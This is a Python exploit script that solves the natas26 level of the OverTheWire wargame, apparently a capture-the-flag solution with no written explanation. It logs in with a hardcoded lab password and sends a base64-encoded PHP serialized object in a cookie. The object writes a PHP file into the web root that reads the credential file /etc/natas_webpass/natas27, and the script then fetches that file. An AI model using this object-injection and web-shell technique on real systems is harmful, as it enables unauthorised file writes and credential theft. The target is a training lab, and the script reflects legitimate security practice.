import requests
import string
from requests.auth import HTTPBasicAuth

# debug=true to get the complete query string in the result
url = 'http://natas26.natas.labs.overthewire.org/'
response = ''
# base auth
auth = HTTPBasicAuth('natas26', 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T')

# setup a new session
session = requests.Session()
response = session.post(url, auth=auth)
sessionId = session.cookies.get_dict()['PHPSESSID']
cookies = { 'PHPSESSID' : sessionId, 'drawing' : 'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvYXNkZi5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czowOiIiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo2MzoiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4KIjt9' }
response = session.get(url, cookies=cookies, auth=auth)
response = session.get(url + '/img/asdf.php', auth=auth)
text = response.text
print(text)

